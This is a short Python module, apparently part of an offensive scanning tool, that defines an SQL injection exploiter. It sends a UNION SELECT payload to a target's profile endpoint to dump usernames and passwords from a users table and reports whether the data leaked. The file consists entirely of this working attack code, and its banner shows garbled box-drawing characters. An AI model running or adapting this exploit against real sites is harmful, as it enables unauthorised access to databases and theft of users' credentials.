# modules/exploits/sqli_exploit.py
from core.scanner_base import ScannerBase

class SQLiExploiter(ScannerBase):
    def __init__(self, url):
        super().__init__(url)
        
    def exploit(self):
        print("""
        â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
        â•‘   ğŸš¨ SQLi EXPLOITER ğŸš¨     â•‘
        â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        """)
        
        print(f"[*] Attempting SQL Injection on {self.target}")
        
        payload = "' UNION SELECT username, password FROM users--"
        test_url = f"{self.target}/profile?id=1{payload}"
        
        try:
            resp = self._send_request(test_url)
            if resp and "username" in resp.text and "password" in resp.text:
                print("[+] SQLi Exploit successful! Dumped database records")
                return True
            else:
                print("[!] SQLi Exploit failed - no data leaked")
                return False
        except Exception as e:
            print(f"[!] Exploit failed: {str(e)}")
            return False
